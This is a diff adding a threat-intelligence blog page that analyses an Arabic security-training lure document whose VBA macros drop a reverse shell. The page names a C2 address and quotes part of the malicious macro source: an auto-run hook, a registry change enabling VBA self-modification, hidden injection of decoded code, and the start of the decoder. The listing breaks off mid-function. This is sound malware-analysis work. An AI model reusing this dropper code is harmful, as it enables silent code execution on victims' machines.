@@ -1,0 +1,978 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Threat intelligence and malware analysis research">
+      
+      
+        <meta name="author" content="V0lundr">
+      
+      
+        <link rel="canonical" href="https://v0lundr.github.io/blog/arabic-vba-reverse-shell/">
+      
+      
+        <link rel="prev" href="../rmm-via-adobe-themed-download/">
+      
+      
+      
+        
+      
+      
+        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../feed_rss_updated.xml">
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Arabic Security-Training Lure Deploying a VBA Reverse Shell - V0lundr</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="amber">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#arabic-security-training-lure-deploying-a-vba-reverse-shell" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+<header class="site-header">
+  <div class="site-header__inner">
+
+    <!-- Left: handle -->
+    <a href="https://v0lundr.github.io/" class="site-header__logo">
+      // theUnattributed
+    </a>
+
+    <!-- Centre: nav links -->
+    <nav class="site-header__nav">
+      <a href="https://v0lundr.github.io/" class="site-header__link ">Home</a>
+      <a href="https://v0lundr.github.io/about/" class="site-header__link ">About</a>
+    </nav>
+
+    <!-- Right: search -->
+    <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+  </div>
+</header>
+
+<style>
+  /* ── KILL DEFAULT HEADER & TABS ─────────────────────────── */
+  .md-header { display: none !important; }
+  .md-tabs   { display: none !important; }
+
+  /* ── CUSTOM HEADER ──────────────────────────────────────── */
+
+  .site-header {
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    background: rgba(7,9,15,0.95);
+    border-bottom: 1px solid #1e2535;
+    backdrop-filter: blur(12px);
+  }
+
+  .site-header__inner {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 2rem;
+    height: 52px;
+    display: flex;
+    align-items: center;
+    gap: 2rem;
+  }
+
+  /* Handle / logo */
+  .site-header__logo {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.85rem;
+    font-weight: 400;
+    letter-spacing: 0.06em;
+    color: #e8a84c;
+    text-decoration: none;
+    white-space: nowrap;
+    flex-shrink: 0;
+  }
+
+  /* Nav links */
+  .site-header__nav {
+    display: flex;
+    align-items: center;
+    gap: 0.25rem;
+    flex: 1;
+  }
+
+  .site-header__link {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.68rem;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: #8898b0;
+    text-decoration: none;
+    padding: 0.3rem 0.7rem;
+    border-radius: 2px;
+    transition: color 0.15s, background 0.15s;
+  }
+
+  .site-header__link:hover {
+    color: #e8a84c;
+    background: rgba(232,168,76,0.06);
+  }
+
+  .site-header__link.active {
+    color: #e8a84c;
+  }
+
+  /* Search — override Material defaults to fit our bar */
+  .md-search {
+    flex-shrink: 0;
+  }
+
+  .md-search__form {
+    background: #0d1119 !important;
+    border: 1px solid #1e2535 !important;
+    border-radius: 2px !important;
+    height: 32px !important;
+    width: 200px !important;
+  }
+
+  .md-search__form:focus-within {
+    border-color: #e8a84c !important;
+    width: 280px !important;
+    transition: width 0.2s ease;
+  }
+
+  .md-search__input {
+    font-family: 'JetBrains Mono', monospace !important;
+    font-size: 0.75rem !important;
+    color: #c8d0de !important;
+  }
+
+  .md-search__input::placeholder {
+    color: #5a6478 !important;
+  }
+
+  .md-search__icon {
+    color: #5a6478 !important;
+  }
+
+  /* Offset page content so sticky header doesn't overlap */
+  .md-main {
+    padding-top: 0 !important;
+  }
+
+  @media (max-width: 600px) {
+    .site-header__logo { display: none; }
+    .md-search__form { width: 140px !important; }
+  }
+</style>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    document.querySelectorAll("a").forEach(function (link) {
+      if (link.textContent.trim() === "Back to index") {
+        link.setAttribute("href", "/");
+      }
+    });
+  });
+</script>
+
+
+<footer class="site-footer-custom">
+  <div class="site-footer-inner">
+    <span class="footer-note">v0lundr.github.io · TLP:WHITE</span>
+    <div class="footer-links">
+      <a href="https://github.com/V0lundr" target="_blank" rel="noopener">GitHub</a>
+      <a href="/feed_rss_created.xml" target="_blank" rel="noopener">RSS</a>
+    </div>
+  </div>
+</footer>
+
+<style>
+  /* Hide default Material footer */
+  .md-footer { display: none !important; }
+
+  .site-footer-custom {
+    border-top: 1px solid #1e2535;
+    background: #07090f;
+    padding: 1.5rem 0;
+  }
+
+  .site-footer-inner {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 2rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 1rem;
+  }
+
+  .footer-note {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.65rem;
+    color: #5a6478;
+    letter-spacing: 0.06em;
+  }
+
+  .footer-links {
+    display: flex;
+    gap: 1.5rem;
+  }
+
+  .footer-links a {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.65rem;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: #5a6478;
+    text-decoration: none;
+    transition: color 0.15s;
+  }
+
+  .footer-links a:hover { color: #e8a84c; }
+</style>
+
+
+
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../about/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="V0lundr" class="md-nav__button md-logo" aria-label="V0lundr" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    V0lundr
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    About
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+<nav class="md-nav md-nav--secondary" aria-label="Contents">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+  <div class="md-content md-content--post" data-md-component="content">
+    <div class="md-sidebar md-sidebar--post" data-md-component="sidebar" data-md-type="navigation">
+      <div class="md-sidebar__scrollwrap">
+        <div class="md-sidebar__inner md-post">
+          <nav class="md-nav md-nav--primary">
+            <div class="md-post__back">
+              <div class="md-nav__title md-nav__container">
+                <a href="../" class="md-nav__link">
+                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+                  <span class="md-ellipsis">
+                    Back to index
+                  </span>
+                </a>
+              </div>
+            </div>
+            
+              <div class="md-post__authors md-typeset">
+                
+                  <div class="md-profile md-post__profile">
+                    <span class="md-author md-author--long">
+                      <img src="https://github.com/V0lundr.png" alt="V0lundr">
+                    </span>
+                    <span class="md-profile__description">
+                      <strong>
+                        
+                          V0lundr
+                        
+                      </strong>
+                      <br>
+                      Threat Intelligence Researcher
+                    </span>
+                  </div>
+                
+              </div>
+            
+            <ul class="md-post__meta md-nav__list">
+              <li class="md-nav__item md-nav__item--section">
+                <div class="md-post__title">
+                  <span class="md-ellipsis">
+                    Metadata
+                  </span>
+                </div>
+                <nav class="md-nav">
+                  <ul class="md-nav__list">
+                    <li class="md-nav__item">
+                      <div class="md-nav__link">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"/></svg>
+                        <time datetime="2026-05-11 00:00:00+00:00" class="md-ellipsis">2026-05-11</time>
+                      </div>
+                    </li>
+                    
+                    
+                    
+                      
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"/></svg>
+                          <span class="md-ellipsis">
+                            
+                              13 min read
+                            
+                          </span>
+                        </div>
+                      </li>
+                    
+                  </ul>
+                </nav>
+              </li>
+            </ul>
+            
+          </nav>
+          
+        </div>
+      </div>
+    </div>
+    <article class="md-content__inner md-typeset">
+      
+        
+  
+
+
+
+
+<h1 id="arabic-security-training-lure-deploying-a-vba-reverse-shell">Arabic Security-Training Lure Deploying a VBA Reverse Shell<a class="headerlink" href="#arabic-security-training-lure-deploying-a-vba-reverse-shell" title="Permanent link">&para;</a></h1>
+<hr />
+<h1 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h1>
+<p>In May 2026, I stumbled upon a weaponised Microsoft Word macro-enabled template (<code>.dotm</code>, 33,966 bytes, SHA-256 <code>e6cc542b690066cf6914e88199ce234236f2d929f313af8b0b2f8babe43d4f7d</code>) that surfaced through one of the VirusTotal hunting rule. The template carries an Arabic-language lure themed as a peer-to-peer review request for a "third security training course", stored as an AutoText entry rather than in the visible document body.</p>
+<!-- more -->
+
+<p><img alt="Pasted image 20260511115710.png" src="../images/Pasted%20image%2020260511115710.png" />
+Exhibit 1: Lure Document</p>
+<p>Its VBA project, on <code>Document_Open</code>, decodes a letter-encoded ASCII-triplet payload from a UserForm TextBox and attempts to inject it as new VBA into the user's Normal.dotm global template through the Office object model. The stage-2 reverse shell connects to <code>51.38.87.253:25255</code> and bound an interactive <code>cmd.exe</code> to the socket on every <code>Document_Close</code>. The IP <code>51.38.87.253</code> has been associated with APT42 / Charming Kitten (Iranian-nexus, also tracked as TA453, Mint Sandstorm, Yellow Garuda) infrastructure</p>
+<h2 id="lure-document-analysis">Lure Document Analysis<a class="headerlink" href="#lure-document-analysis" title="Permanent link">&para;</a></h2>
+<p>The lure is a one-page Arabic-language course brochure for a six-day private-security training programme, framed as a draft schedule that the author wants reviewed before delivery. It opens with the Islamic Basmala, then lays out a table of topics, timings, learning outcomes, and target beneficiaries - running from 9 AM to noon daily - covering the duties and attributes of a security guard, security awareness, body language and threat recognition, search techniques, dealing with different segments of society, emergency response, watchtower and alarm operation, radio communications, conflict management, risk assessment, dress and standing posture, VIP protection, security report writing, and "the ethics of Islam in security work." The intended audience is named explicitly: security personnel generally, facility/company/shop guards, residential guards, and anyone interested in the subject. It closes with the signature of "Mr. Maytham Al-Uraimi" - a name with Omani/Emirati Gulf-region resonance - which, combined with the <code>Arabic.dotm</code> template and the otherwise mundane, professionally-framed content, makes it look like a piece of legitimate Gulf private-security training material that was either authored by or scraped from a real practitioner and then repurposed as a social-engineering wrapper.</p>
+<p>The sample is a Microsoft Word 2007+ macro-enabled template (<code>.dotm</code>), not a macro-enabled document (<code>.docm</code>). The <code>[Content_Types].xml</code> part-type override for <code>word/document.xml</code> is the canonical <code>.dotm</code> content type and the file's MIME identifier matches. Templates are loaded by Word into the global template chain at session start and run their VBA on <code>Document_Open</code> for any document derived from them, which makes the template-format choice operationally meaningful: the malicious VBA runs in a slightly different trust path from a regular <code>.docm</code> lure.</p>
+<p><img alt="Pasted image 20260511114147.png" src="../images/Pasted%20image%2020260511114147.png" />
+Exhibit 2: Document Metadata</p>
+<p>The template's metadata reports <code>Creator: Win10</code> (the Word-internal application-creator identifier left at a generic value, not a typed operator persona) and <code>Last Modified By: Kristina Rowell</code>.</p>
+<p>The metadata timestamps place the template's authoring window in <strong>February 2022</strong>, with a <code>Create Date</code> of <code>2022-02-06 12:21:00 UTC</code>, a <code>Modify Date</code> of <code>2022-02-09 14:30:00 UTC</code>, 13 recorded revisions, and a total edit time of one minute. The sample landed in the VirusTotal hunting queue in May 2026 and uploaded from Bangladesh, leaving a ~4-year gap between authoring and observed delivery. Either the operator is using a long-reused tooling artifact, or the metadata timestamps are spoofed, both are plausible.</p>
+<p>A second, stronger temporal signal is the ZIP archive's per-entry modification dates. Every one of the 20 OOXML parts inside the <code>.dotm</code> is timestamped <code>1980-01-01 00:00:00</code>, the DOS-time epoch zero. Microsoft Word does not produce this — when Word saves a <code>.dotm</code>, each part receives a real <code>Zip Modify Date</code>. A uniform epoch-zero stamp across every entry means the OOXML container was <strong>re-packed by an external tool after Word built it</strong>, typically a Python <code>zipfile.ZipInfo(..., date_time=(1980,1,1,0,0,0))</code> builder or a similar weaponisation helper. This is evidence of a build pipeline, not of an operator clicking "Save" in Word.</p>
+<p><img alt="Pasted image 20260511115139.png" src="../images/Pasted%20image%2020260511115139.png" />
+Exhibit 3: ZIP Listing Showing all 20 Entries Pinned to <code>1980-01-01 00:00:00</code> - the File was Re-packaged Outside Word.</p>
+<h2 id="vba-project-analysis">VBA Project Analysis<a class="headerlink" href="#vba-project-analysis" title="Permanent link">&para;</a></h2>
+<p>The VBA project (<code>word/vbaProject.bin</code>, 34,816 bytes) is the legacy OLE2 wrapper Office still uses for VBA inside OOXML. Static triage with <code>oleid</code> reports a high-risk VBA project with suspicious indicators.</p>
+<p><img alt="Pasted image 20260511115345.png" src="../images/Pasted%20image%2020260511115345.png" />
+Exhibit 4: <code>oleid</code> Triage Output</p>
+<p>The OLE2 project contains ten streams across two code modules: <code>VBA/ThisDocument</code> (the dropper) and <code>VBA/UserForm1</code> (a near-empty code-behind for the UserForm that holds the encoded payload). The <code>oledump.py -i</code> listing splits each <code>M</code>-flagged code stream into compiled p-code and compressed source; <code>ThisDocument</code> carries <code>4611 + 1630</code> bytes (p-code + source) and <code>UserForm1</code> carries <code>1045 + 274</code>. </p>
+<p><img alt="Pasted image 20260511121503.png" src="../images/Pasted%20image%2020260511121503.png" />
+Exhibit 5: VBA Stream Layout</p>
+<h2 id="macro-execution-chain">Macro Execution Chain<a class="headerlink" href="#macro-execution-chain" title="Permanent link">&para;</a></h2>
+<p>Further analysis revealed that <code>Document_Open</code> is the only autoexec hook (<code>vbaData.xml</code>: <code>&lt;wne:eventDocOpen/&gt;</code>; project name <code>TemplateProject</code>). It sets view to <code>wdPrintView</code>, unprotects with the hard-coded password <code>20exlnt20</code>, sets <code>alreadyLaunched = True</code>, and calls <code>Launch</code>. <code>alreadyLaunched</code> is never declared at module scope, so VBA gives each sub its own implicit procedure-local Variant; <code>Launch</code>'s gating check fails against a fresh local and execution continues into <code>SubstitutePage</code> and <code>Create_Word</code>.</p>
+<p><code>SubstitutePage</code> replaces the (empty) body with the AutoText entry <code>Doc</code> from the attached <code>Arabic.dotm</code> template and saves.</p>
+<p><code>Create_Word</code> writes <code>HKCU\SOFTWARE\Microsoft\Office\16.0\Word\Security\AccessVBOM = 1</code> to permit VBA self-modification, decodes the 16,392-character letter-encoded payload from <code>UserForm1.TextBox1.Text</code> via <code>Putin</code> (letter-to-digit substitution <code>a → 0</code> … <code>j → 9</code>, then <code>Chr(...)</code> over each three-digit group; 5,464 bytes of VBA out), instantiates a hidden <code>Word.Application</code> (<code>Visible = 0</code>, <code>DisplayAlerts = 0</code>), creates a transient document via <code>Documents.Add("")</code>, and calls <code>doc.VBProject.VBComponents(1).CodeModule.AddFromString (Putin(content))</code> to inject the decoded VBA into that transient document's <code>ThisDocument</code> module. It then closes the transient document with no <code>SaveChanges</code> (suppressed by <code>DisplayAlerts = 0</code>), quits the hidden app, and chains into <code>unlink</code>. The transient document never reaches disk; the stage-2 VBA does not survive <code>Create_Word</code>'s return.</p>
+<p><code>unlink</code> is the apparent persistence move and does not work as intended. It reassigns <code>ActiveDocument.AttachedTemplate</code> from <code>Arabic.dotm</code> to <code>C:\Users\&lt;UserName&gt;\AppData\Roaming\Microsoft\Templates\Normal.dotm</code> (resolved via <code>Application.UserName</code>), saves the lure, and closes it. This is a pointer change on the lure's attached-template property; it does not copy VBA code between projects, and <code>Normal.dotm</code> is not modified. <code>DeleteVBAPROJECT</code> (the component-wipe) is reachable only via <code>unlink</code>'s <code>On Error GoTo Destroy</code> guard; on a clean execution <code>Exit Sub</code> returns first and the wipe never runs. The lure on disk ends up with its <code>AttachedTemplate</code> pointer redirected to <code>Normal.dotm</code> and its own VBA project intact.</p>
+<p><strong>Net effect:</strong> <code>AccessVBOM = 1</code>, lure body replaced with the Arabic decoy, attached-template pointer moved to <code>Normal.dotm</code>, lure re-saved and closed. The stage-2 reverse shell is constructed but not persisted and not executed. The chain does not, as written, achieve the apparent operator intent; runtime confirmation would settle whether a Word internal quirk inherits the transient document's VBProject into <code>Normal.dotm</code> despite the discard.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Attribute VB_Name = &quot;ThisDocument&quot;
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Attribute VB_Base = &quot;0{00020906-0000-0000-C000-000000000046}&quot;
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Attribute VB_GlobalNameSpace = False
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>Attribute VB_Creatable = False
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>Attribute VB_PredeclaredId = True
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>Attribute VB_Exposed = True
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>Attribute VB_TemplateDerived = False
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>Attribute VB_Customizable = True
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>Sub Document_Open()
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>    If ActiveDocument.ActiveWindow.View.Type &lt;&gt; wdPrintView Then
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>        ActiveDocument.ActiveWindow.View.Type = wdPrintView
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>    End If
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>    If ActiveDocument.ProtectionType &lt;&gt; wdNoProtection Then ActiveDocument.Unprotect _
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>       Password:=&quot;20exlnt20&quot;
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>    alreadyLaunched = True
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>    Launch
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>End Sub
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>Private Sub Launch()
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>    If alreadyLaunched = True Then
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>        Exit Sub
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>    End If
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>    SubstitutePage
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>    Create_Word
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>    alreadyLaunched = True
+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>End Sub
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>Sub Create_Word()
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>    CreateObject(&quot;Wscript.Shell&quot;).RegWrite &quot;HKCU\SOFTWARE\Microsoft\Office\16.0\Word\Security\AccessVBOM&quot;, 1, &quot;REG_DWORD&quot;
+</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>    Dim content As String
+</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>    content = UserForm1.TextBox1.Text
+</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>    DoEvents
+</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>    Set Wordy = Interaction.CreateObject(&quot;Word.Application&quot;)
+</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>    Wordy.DisplayAlerts = 0
+</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>    Wordy.Visible = 0
+</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a>    Set doc = Wordy.Documents.Add(&quot;&quot;)
+</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a>    doc.Saved = True
+</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a>    doc.VBProject.VBComponents(1).CodeModule.AddFromString (Putin(content))
+</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a>    doc.Close
+</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a>    Wordy.Quit
+</span><span id="__span-0-39"><a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a>    unlink
+</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a>End Sub
+</span><span id="__span-0-41"><a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a>Private Function Putin(i As String) As String
+</span><span id="__span-0-42"><a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a>    Dim o As String
+</span><span id="__span-0-43"><a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a>    i = Replace(i, &quot;a&quot;, &quot;0&quot;)
+</span><span id="__span-0-44"><a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a>    i = Replace(i, &quot;b&quot;, &quot;1&quot;)
+</span><span id="__span-0-45"><a id="__codelineno-0-45" name="__codelineno-0-45" href="#__codelineno-0-45"></a>    i = Replace(i, &quot;c&quot;, &quot;2&quot;)
+</span><span id="__span-0-46"><a id="__codelineno-0-46" name="__codelineno-0-46" href="#__codelineno-0-46"></a>    i = Replace(i, &quot;d&quot;, &quot;3&quot;)
+</span><span id="__span-0-47"><a id="__codelineno-0-47" name="__codelineno-0-47" href="#__codelineno-0-47"></a>    i = Replace(i, &quot;e&quot;, &quot;4&quot;)
+</span><span id="__span-0-48"><a id="__codelineno-0-48" name="__codelineno-0-48" href="#__codelineno-0-48"></a>    i = Replace(i, &quot;f&quot;, &quot;5&quot;)
+</span><span id="__span-0-49"><a id="__codelineno-0-49" name="__codelineno-0-49" href="#__codelineno-0-49"></a>    i = Replace(i, &quot;g&quot;, &quot;6&quot;)
+</span><span id="__span-0-50"><a id="__codelineno-0-50" name="__codelineno-0-50" href="#__codelineno-0-50"></a>    i = Replace(i, &quot;h&quot;, &quot;7&quot;)
+</span><span id="__span-0-51"><a id="__codelineno-0-51" name="__codelineno-0-51" href="#__codelineno-0-51"></a>    i = Replace(i, &quot;i&quot;, &quot;8&quot;)
